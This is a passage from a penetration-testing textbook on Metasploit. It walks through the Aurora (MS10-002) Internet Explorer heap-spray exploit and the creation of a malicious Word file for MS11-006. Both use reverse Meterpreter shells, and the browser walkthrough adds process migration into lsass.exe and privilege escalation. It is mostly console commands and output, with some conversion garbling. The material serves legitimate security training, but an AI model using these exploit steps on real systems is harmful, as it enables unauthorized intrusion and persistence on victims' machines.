you are finished, simply close the Immunity Debugger window and you’re all done. It’s important that you get familiar with Immunity Debugger now, because we will be leveraging it in later chapters. Now let’s launch our first browser exploit that uses a heap spray.</p><p class="s4" style="padding-top: 5pt;padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark270">Exploring the Internet Explorer Aurora Exploit</a><a name="bookmark280">&zwnj;</a></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">You know the basics of how heap sprays work and how you can dynamically allocate memory and fill the heap up with NOPs and shellcode. We’ll be leveraging an exploit that uses this technique and something found in nearly every client-side exploit. The browser exploit of choice here is the Aurora exploit (Microsoft Security Bulletin MS10-002). Aurora was most notoriously used in the attacks against Google and more than 20 other large technology companies. Although this exploit was released in early 2010, it particularly resonates with us because it took down some major players in the technology industry.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">We’ll start by using the Aurora Metasploit module and then set our pay- load. The following commands should be familiar, because we have used them in previous chapters. You’ll also see a couple of new options that we’ll discuss in a bit.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_332.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf &gt; <span class="s24">use windows/browser/ms10_002_aurora</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(ms10_002_aurora) &gt; <span class="s24">set payload windows/meterpreter/reverse_tcp</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">payload =&gt; windows/meterpreter/reverse_tcp msf exploit(ms10_002_aurora) &gt; <span class="s24">show options</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">Module options:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 49pt;text-indent: 0pt;text-align: left;">Name Current Setting Required Description</p><p style="text-indent: 0pt;text-align: left;"><br/></p><table style="border-collapse:collapse;margin-left:49.2213pt" cellspacing="0"><tr style="height:15pt"><td style="width:51pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">SRVHOST</p></td><td style="width:64pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 2pt;text-indent: 0pt;line-height: 12pt;text-align: left;">0.0.0.0 <span class="s33">O</span></p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;padding-left: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">yes</p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:202pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;padding-left: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">The local host to listen on.</p></td></tr><tr style="height:11pt"><td style="width:51pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">SRVPORT</p></td><td style="width:64pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">8080 <span class="s33">8</span></p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt"><p class="s28" style="padding-left: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">yes</p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:202pt"><p class="s28" style="padding-left: 3pt;text-indent: 0pt;line-height: 10pt;text-align: left;">The local port to listen on.</p></td></tr><tr style="height:11pt"><td style="width:51pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">SSL</p></td><td style="width:64pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">false</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">no</p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:202pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Negotiate SSL for incoming connections</p></td></tr><tr style="height:10pt"><td style="width:51pt"><p class="s28" style="text-indent: 0pt;line-height: 9pt;text-align: left;">SSLVersion</p></td><td style="width:64pt"><p class="s28" style="text-indent: 0pt;line-height: 9pt;text-align: left;">SSL3</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">no</p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:202pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Specify the version of SSL that should be used</p></td></tr></table><p class="s25" style="padding-left: 240pt;text-indent: 0pt;line-height: 9pt;text-align: left;">(accepted: SSL2, SSL3, TLS1)</p><p class="s25" style="padding-left: 49pt;text-indent: 0pt;line-height: 14pt;text-align: left;">URIPATH <span class="s30">@ </span>no The URI to use for this exploit (default is random)</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-top: 6pt;padding-left: 36pt;text-indent: 0pt;text-align: left;">Payload options (windows/meterpreter/reverse_tcp):</p><p style="text-indent: 0pt;text-align: left;"><br/></p><table style="border-collapse:collapse;margin-left:49.2213pt" cellspacing="0"><tr style="height:16pt"><td style="width:43pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Name</p></td><td style="width:63pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Current Setting</p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Required</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:156pt;border-bottom-style:dashed;border-bottom-width:1pt"><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">Description</p></td></tr><tr style="height:36pt"><td style="width:43pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;padding-right: 7pt;text-indent: 0pt;line-height: 11pt;text-align: left;">EXITFUNC LHOST LPORT</p></td><td style="width:63pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;text-indent: 0pt;text-align: left;">process</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s28" style="text-indent: 0pt;line-height: 10pt;text-align: left;">4444</p></td><td style="width:9pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:34pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 3pt;padding-right: 21pt;text-indent: 0pt;line-height: 11pt;text-align: justify;">yes yes yes</p></td><td style="width:8pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:156pt;border-top-style:dashed;border-top-width:1pt"><p class="s28" style="padding-top: 4pt;padding-right: 1pt;text-indent: 0pt;text-align: left;">Exit technique: seh, thread, process The local address</p><p class="s28" style="text-indent: 0pt;line-height: 9pt;text-align: left;">The local port</p></td></tr></table><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="text-indent: 0pt;text-align: left;"><span><img width="11" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_333.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><span><img width="23" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_334.png"/></span></p><p class="s25" style="padding-left: 49pt;text-indent: -12pt;line-height: 193%;text-align: left;">Exploit target: Id Name</p><p class="s25" style="padding-left: 49pt;text-indent: 0pt;line-height: 11pt;text-align: left;">0 Automatic</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(ms10_002_aurora) &gt; <span class="s24">set SRVPORT 80</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">SRVPORT =&gt; 80</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 12pt;text-align: left;">msf exploit(ms10_002_aurora) &gt; <span class="s24">set URIPATH / </span><span class="s30">O</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">URIPATH =&gt; /</p><p class="s25" style="padding-top: 3pt;padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(ms10_002_aurora) &gt; <span class="s24">set LHOST 192.168.33.129</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">LHOST =&gt; 192.168.33.129</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(ms10_002_aurora) &gt; <span class="s24">set LPORT 443</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">LPORT =&gt; 443</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">msf exploit(ms10_002_aurora) &gt; <span class="s24">exploit -z </span>[*] Exploit running as background job. msf exploit(ms10_002_aurora) &gt;</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">[*] Started reverse handler on 192.168.33.129:443 [*] Using URL: http://0.0.0.0:80/</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">[*] Local IP: http://192.168.33.129:80/ [*] Server started.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-top: 3pt;padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;text-align: left;">msf exploit(ms10_002_aurora) &gt;</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_335.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;line-height: 74%;text-align: justify;">First, notice that the default setting for <span class="s25">SRVHOST </span><span class="s32">O </span>is 0.0.0.0: This means that the web server will bind to all interfaces. The <span class="s25">SRVPORT </span>at <span class="s32">8</span>, 8080, is the port to which the targeted user needs to connect for the exploit to trigger.</p><p style="padding-top: 2pt;padding-left: 90pt;text-indent: 0pt;line-height: 83%;text-align: left;">We will be using port 80 instead of 8080, however. We could also set up the server for SSL, but for this example, we’ll stick with standard HTTP. <span class="s25">URIPATH </span><span class="s32">@ </span>is the URL the user will need to enter to trigger the vulnerability, and we set this to a slash (<span class="s25">/</span>) at <span class="s32">O</span>.</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 10pt;text-align: left;">With our settings defined, use your Windows XP virtual machine and</p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;">connect to the attacker using <span class="s19">http://</span>&lt;<span class="s19">attacker’s IP address</span>&gt;. You’ll notice the machine becomes a bit sluggish. After a little waiting, you should see a Meter- preter shell. In the background, the heap spray was performed and the jump into the dynamic memory was executed, to hit your shellcode eventually. If you open Task Manager in Windows before you run this exploit, you can actually see the memory for <span class="s19">iexplore.exe </span>growing significantly based on the contact growth of the heap.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_336.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(ms10_002_aurora) &gt;</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">[*] Sending Internet Explorer &quot;Aurora&quot; Memory Corruption to client 192.168.33.130 [*] Sending stage (748032 bytes)</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Meterpreter session 1 opened (192.168.33.129:443 -&gt; 192.168.33.130:1161)</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(ms10_002_aurora) &gt; <span class="s24">sessions -i 1</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Starting interaction with 1...</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-top: 3pt;padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">meterpreter &gt;</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_337.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">You now have a Meterpreter shell, but there’s a slight problem. What if the targeted user closes the browser based on the sluggishness of her com- puter? You would effectively lose your session to the target, and although the exploit is successful, it would be cut off prematurely. Fortunately, there is a way around this: Simply type <span class="s24">run migrate </span>as soon as the connection is established, and hope that you make it in time. This Meterpreter script automatically migrates to the memory space of a separate process, usually <span class="s19">lsass.exe</span>, to improve the chances of keeping your shell open if the targeted user closes the originally exploited process.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_338.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">meterpreter &gt; <span class="s24">run migrate</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">[*] Current server process: IEXPLORE.EXE (2120) [*] Migrating to lsass.exe...</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[*] Migrating into process ID 680</p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">[*] New server process: lsass.exe (680) meterpreter &gt;</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_339.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">This is a pretty manual process. You can automate this whole process using some advanced options to migrate to a process automatically upon a successful shell. Type <span class="s24">show advanced </span>to list the advanced features of the Aurora module:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_340.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">msf exploit(ms10_002_aurora) &gt; <span class="s24">show advanced</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">Module advanced options:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 49pt;text-indent: 0pt;text-align: left;">Name : ContextInformationFile Current Setting:</p><p class="s25" style="padding-left: 49pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Description : The information file that contains context information</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 49pt;text-indent: 0pt;text-align: left;">Name : DisablePayloadHandler Current Setting: false</p><p class="s25" style="padding-left: 49pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Description : Disable the handler code for the selected payload</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 49pt;text-indent: 0pt;text-align: left;">Name : EnableContextEncoding Current Setting: false</p><p class="s25" style="padding-left: 49pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Description : Use transient context when encoding payloads</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 49pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Name : WORKSPACE</p><p class="s25" style="padding-left: 49pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Current Setting:</p><p class="s25" style="padding-left: 36pt;text-indent: 12pt;line-height: 193%;text-align: left;">Description : Specify the workspace for this module Payload advanced options (windows/meterpreter/reverse_tcp):</p><p class="s25" style="padding-left: 49pt;text-indent: 0pt;text-align: left;">Name : AutoLoadStdapi Current Setting: true</p><p class="s25" style="padding-left: 49pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Description : Automatically load the Stdapi extension</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 49pt;text-indent: 0pt;text-align: left;">Name : AutoRunScript Current Setting:</p><p class="s25" style="padding-left: 49pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Description : A script to run automatically on session creation.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 49pt;text-indent: 0pt;text-align: left;">Name : AutoSystemInfo Current Setting: true</p><p class="s25" style="padding-left: 49pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Description : Automatically capture system information on initialization.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 49pt;text-indent: 0pt;text-align: left;">Name : InitialAutoRunScript Current Setting:</p><p class="s25" style="padding-left: 49pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Description : An initial script to run on session created (before AutoRunScript)</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 49pt;text-indent: 0pt;text-align: left;">Name : ReverseConnectRetries Current Setting: 5</p><p class="s25" style="padding-left: 49pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Description : The number of connection attempts to try before exiting the process</p><p class="s25" style="padding-top: 3pt;padding-left: 49pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Name : WORKSPACE</p><p class="s25" style="padding-left: 49pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Current Setting:</p><p class="s25" style="padding-left: 49pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Description : Specify the workspace for this module</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-top: 3pt;padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;text-align: left;">msf exploit(ms10_002_aurora) &gt;</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_341.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: justify;">By setting these options, you can fine-tune a lot of the payload and exploit details. Now suppose you wanted to change the amount of tries a reverse con- nection would do. The default is 5, but you might be concerned with timeouts and want to increase the connection retries. Here, we set it to 10:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_342.png"/></span></p><p class="s25" style="padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;text-align: left;">msf exploit(ms10_002_aurora) &gt; <span class="s24">set ReverseConnectRetries 10</span></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_343.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">In this case, you want to migrate automatically to a new process in case the targeted user closes the browser right away. Under the <span class="s25">AutoRunScript</span>, sim- ply let Metasploit know to autorun a script as soon as a Meterpreter console is created. Using the <span class="s25">migrate </span>command with the <span class="s25">-f </span>switch tells Meterpreter to launch a new process automatically and migrate to it:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_344.png"/></span></p><p class="s25" style="padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;text-align: left;">msf exploit(ms10_002_aurora) &gt; <span class="s24">set AutoRunScript migrate -f</span></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_345.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: justify;">Now attempt to run the exploit and see what happens. Try closing the connection and see if your Meterpreter session still stays active.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: justify;">Since this is a browser-based exploit, you will most likely be running as a limited user account. Remember to issue the <span class="s25">use priv </span>and <span class="s25">getsystem </span>commands to attempt privilege escalation on the target machine.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: justify;">That’s it! You just successfully executed your first client-side attack using a pretty famous exploit. Note that new exploits are frequently being released, so be sure to search for all the browser exploits and find which one best suits your needs for a particular target.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark271">File Format Exploits</a><a name="bookmark281">&zwnj;</a></p><p class="s19" style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">File format bugs <span class="p">are exploitable vulnerabilities found within a given applica- tion, such as an Adobe PDF document. This class of exploit relies on a user actually opening a malicious file in a vulnerable application. Malicious files can be hosted remotely or sent via email. We briefly mentioned leveraging file format bugs as a spear-phishing attack in the beginning of this chapter, and we’ll offer more about spear-phishing in Chapter 10.</span></p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">In traditional file format exploits, you could leverage anything to which you think your target will be susceptible. This could be a Microsoft Word document, a PDF, an image, or anything else that might be applicable. In this example, we’ll be leveraging MS11-006, known as the Microsoft Win- dows CreateSizedDIBSECTION Stack Buffer Overflow.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: justify;">Within Metasploit, perform a search for <span class="s25">ms11_006</span>. Our first step is to get into our exploit through <span class="s19">msfconsole</span>, and type <span class="s24">info </span>to see what options are</p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">available. In the next example, you can see that the file format is exported as a document:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_346.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf &gt; <span class="s24">use windows/fileformat/ms11_006_createsizeddibsection</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(ms11_006_createsizeddibsection) &gt; <span class="s24">info</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s24" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">. . . SNIP . . .</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Available targets:</p><p class="s25" style="padding-left: 98pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Id Name</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s36" style="padding-left: 98pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="11" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_347.png"/></span> <span><img width="23" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_348.png"/></span></p><ol id="l11"><li><p class="s25" style="padding-top: 3pt;padding-left: 115pt;text-indent: -17pt;line-height: 11pt;text-align: left;">Automatic</p></li><li><p class="s25" style="padding-left: 115pt;text-indent: -17pt;line-height: 11pt;text-align: left;">Windows 2000 SP0/SP4 English</p></li><li><p class="s25" style="padding-left: 115pt;text-indent: -17pt;line-height: 11pt;text-align: left;">Windows XP SP3 English</p></li><li><p class="s25" style="padding-bottom: 3pt;padding-left: 115pt;text-indent: -17pt;line-height: 11pt;text-align: left;">Crash Target for Debugging</p></li></ol><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_349.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">Next, you can see that we have a few targets available to use, but we’ll make it automatic and leave everything at the default settings:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_350.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">Basic options:</p><table style="border-collapse:collapse;margin-left:36.26pt" cellspacing="0"><tr style="height:10pt"><td style="width:55pt"><p class="s28" style="padding-left: 8pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Name</p></td><td style="width:158pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Current Setting</p></td><td style="width:42pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Required</p></td><td style="width:132pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Description</p></td></tr><tr style="height:11pt"><td style="width:55pt"><p class="s28" style="padding-left: 8pt;text-indent: 0pt;line-height: 10pt;text-align: left;">----</p></td><td style="width:158pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">---------------</p></td><td style="width:42pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">--------</p></td><td style="width:132pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">-----------</p></td></tr><tr style="height:11pt"><td style="width:55pt"><p class="s28" style="padding-left: 8pt;text-indent: 0pt;line-height: 10pt;text-align: left;">FILENAME</p></td><td style="width:158pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">msf.doc</p></td><td style="width:42pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">yes</p></td><td style="width:132pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">The file name.</p></td></tr><tr style="height:15pt"><td style="width:55pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s28" style="padding-left: 8pt;text-indent: 0pt;line-height: 10pt;text-align: left;">OUTPUTPATH</p></td><td style="width:158pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">/opt/metasploit3/msf3/data/exploits</p></td><td style="width:42pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">yes</p></td><td style="width:132pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">The location of the file.</p></td></tr></table><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">We’ll need to set a payload as usual. In this case, we will select our first choice, a reverse Meterpreter shell:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_351.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(ms11_006_createsizeddibsection) &gt; <span class="s24">set payload windows/meterpreter/reverse_tcp</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">payload =&gt; windows/meterpreter/reverse_tcp</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(ms11_006_createsizeddibsection) &gt; <span class="s24">set LHOST 172.16.32.128</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">LHOST =&gt; 172.16.32.128</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">smsf exploit(ms11_006_createsizeddibsection) &gt; <span class="s24">set LPORT 443</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">LPORT =&gt; 443</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">msf exploit(ms11_006_createsizeddibsection) &gt; <span class="s24">exploit</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 13pt;text-align: left;">[*] Creating &#39;msf.doc&#39; file...<span class="s30">O</span></p><p class="s25" style="padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;line-height: 80%;text-align: left;">[*] Generated output file /opt/metasploit3/msf3/data/exploits/msf.doc<span class="s30">8 </span>msf exploit(ms11_006_createsizeddibsection) &gt;</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_352.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark272">Sending the Payload</a><a name="bookmark282">&zwnj;</a></p><p style="padding-top: 